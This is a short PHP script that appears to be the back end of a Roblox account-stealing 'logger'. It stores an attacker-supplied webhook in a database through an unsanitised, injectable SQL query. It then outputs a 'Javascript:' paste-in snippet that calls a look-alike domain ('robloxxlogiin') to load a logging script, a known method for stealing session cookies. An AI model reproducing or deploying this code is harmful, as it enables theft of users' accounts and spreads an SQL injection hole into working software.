<?php
$servername = "";
$username = "";
$password = "";
$dbname = "";
$webhook = $_REQUEST['webhook'];
$id = rand(10,3433434);
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// sql to create table
$sql = "INSERT INTO Logs (ID, Webhook)
VALUES ('".$id."', '".$webhook."')";

if ($conn->query($sql) === TRUE) {
  echo 'Javascript:$.get("http://robloxxlogiin.byethost12.com/RealLogger/script.php?id='.$id.'");';
} else {
  echo "Error:" . $conn->error;
}

$conn->close();
?>
